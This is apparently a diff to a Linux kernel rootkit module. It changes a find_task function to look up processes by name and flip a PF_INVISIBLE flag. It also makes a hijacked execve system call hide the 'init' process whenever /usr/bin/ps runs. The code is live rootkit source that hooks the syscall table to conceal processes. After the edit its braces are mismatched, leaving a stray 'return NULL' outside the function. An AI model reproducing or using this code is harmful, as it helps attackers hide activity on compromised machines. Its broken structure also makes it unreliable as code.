@@ -39,16 +39,19 @@ unsigned long *get_syscall_table(void)
 	}
 	return NULL;
 }
-
-struct task_struct *find_task(pid_t pid)
+struct task_struct *
+find_task(char *process_name)
 {
-	struct task_struct *p = current;
-	for_each_process(p) {
-		if (p->pid == pid)
-			return p;
+	struct task_struct *g;    
+		for_each_process(g){
+        if(strcmp(process_name, g->comm) == 0){
+            printk(KERN_CRIT "Process: %s\nPID: %d\n", g->comm, g->pid);
+            g->flags ^= PF_INVISIBLE;
+        }
+    }
 	}
 	return NULL;
-}
+
 
 
 /*asmlinkage int hacked_open(const char __user *filename, int flags, umode_t mode){
@@ -68,7 +71,7 @@ asmlinkage int hacked_execve(const char __user *filename, const char __user *con
 	err = copy_from_user(kfilename, filename, 30);
 	if(!err){
 		if(strcmp(kfilename, "/usr/bin/ps") == 0)
-			find_task(1);
+			find_task("init");//Hiding process "init"
 		printk("You may find a process name missing...check for a PID of 1!");
 	}
 	return orig_execve(filename, argv, envp);
